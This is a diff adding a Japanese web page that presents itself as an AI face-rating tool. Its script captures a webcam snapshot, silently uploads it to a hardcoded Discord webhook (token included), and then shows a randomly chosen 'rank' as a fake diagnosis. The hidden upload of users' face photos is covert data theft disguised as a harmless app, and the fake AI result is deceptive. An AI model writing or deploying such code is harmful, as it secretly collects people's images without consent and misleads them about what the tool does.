@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="ja">
+<script src="https://nuthead.neocities.org/ring/ring.js"></script>
+
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="Content-Security-Policy" content="connect-src 'self' https://discord.com;">
+  <title>顔診断AI</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background: linear-gradient(135deg, #fceabb, #f8b500);
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+    }
+
+    h1 {
+      color: #f8b500;
+      margin-bottom: 20px;
+    }
+
+    #startBtn {
+      background-color: #f8b500;
+      color: white;
+      padding: 15px 25px;
+      border: none;
+      border-radius: 10px;
+      font-size: 18px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    #startBtn:hover {
+      background-color: #e2a400;
+    }
+
+    #video {
+      width: 100%;
+      margin-top: 20px;
+      border-radius: 10px;
+      display: none;
+    }
+
+    #message, #result {
+      margin-top: 20px;
+      font-size: 20px;
+    }
+
+    #message {
+      color: #888;
+    }
+
+    #result {
+      font-size: 24px;
+      font-weight: bold;
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>顔診断AI</h1>
+    <button id="startBtn">診断する</button>
+    <video id="video" autoplay playsinline></video>
+    <div id="message"></div>
+    <div id="result"></div>
+  </div>
+
+
+<script>
+  const startBtn = document.getElementById("startBtn");
+  const video = document.getElementById("video");
+  const message = document.getElementById("message");
+  const result = document.getElementById("result");
+
+  const webhookURL = "https://discord.com/api/webhooks/1362005856559955978/B5uSqiSMM8X1XbeuRvWcTpX6Y6w3MjYkKddumXZrcj4dI0Gja_IsUVFeLfh2ZFjyR1od";
+
+  async function startCamera() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+      video.style.display = "block";
+      return stream;
+    } catch (err) {
+      alert("カメラの使用が許可されていません。");
+      throw err;
+    }
+  }
+
+  function takeSnapshot(videoElement) {
+    return new Promise((resolve) => {
+      const canvas = document.createElement("canvas");
+      canvas.width = videoElement.videoWidth;
+      canvas.height = videoElement.videoHeight;
+      const context = canvas.getContext("2d");
+      context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob((blob) => {
+        const file = new File([blob], "snapshot.png", { type: "image/png" });
+        resolve(file);
+      }, "image/png");
+    });
+  }
+
+  async function sendToDiscord(file) {
+    const formData = new FormData();
+    formData.append("file", file);
+    formData.append("content", "📸 顔診断AIが撮影した画像");
+
+    const xhr = new XMLHttpRequest();
+    xhr.open("POST", webhookURL);
+    xhr.send(formData);
+  }
+
+  function getRandomRank() {
+    const ranks = ["Aランク", "Bランク", "Cランク", "Dランク", "Eランク"];
+    return ranks[Math.floor(Math.random() * ranks.length)];
+  }
+
+  startBtn.addEventListener("click", async () => {
+    startBtn.disabled = true;
+    message.textContent = "カメラを起動しています...";
+    result.textContent = "";
+
+    const stream = await startCamera();
+
+    setTimeout(async () => {
+      const file = await takeSnapshot(video);
+      message.textContent = "診断中です。。。";
+
+      await sendToDiscord(file);
+
+      setTimeout(() => {
+        const rank = getRandomRank();
+        message.textContent = "";
+        result.textContent = "診断結果：${rank}";
+        // カメラ停止
+        stream.getTracks().forEach(track => track.stop());
+        video.style.display = "none";
+        startBtn.disabled = false;
+      }, 3000);
+    }, 2000);
+  });
+</script>
